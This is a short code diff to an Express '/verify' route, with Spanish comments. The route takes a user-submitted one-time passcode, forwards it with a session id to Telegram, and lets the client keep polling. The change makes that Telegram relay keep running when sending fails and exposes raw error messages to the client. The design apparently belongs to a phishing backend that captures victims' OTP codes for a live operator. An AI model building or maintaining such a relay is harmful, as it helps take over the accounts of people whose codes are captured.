@@ -20,8 +20,14 @@ router.post('/verify', async (req, res) => {
       code,
     });
 
-    // Enviar a Telegram
-    await telegramService.sendOtpRequest(sessionId, code);
+    // Enviar a Telegram (sin bloquear si falla)
+    try {
+      await telegramService.sendOtpRequest(sessionId, code);
+      console.log('[OTP] Mensaje enviado a Telegram exitosamente');
+    } catch (telegramError) {
+      console.error('[OTP] Error enviando a Telegram:', telegramError.message);
+      // No fallar aquí, dejar que continúe el polling
+    }
 
     // Responder al cliente
     res.json({
@@ -30,7 +36,7 @@ router.post('/verify', async (req, res) => {
     });
   } catch (error) {
     console.error('[OTP ERROR]', error);
-    res.status(500).json({ error: 'Error al procesar OTP' });
+    res.status(500).json({ error: 'Error al procesar OTP: ' + error.message });
   }
 });
 
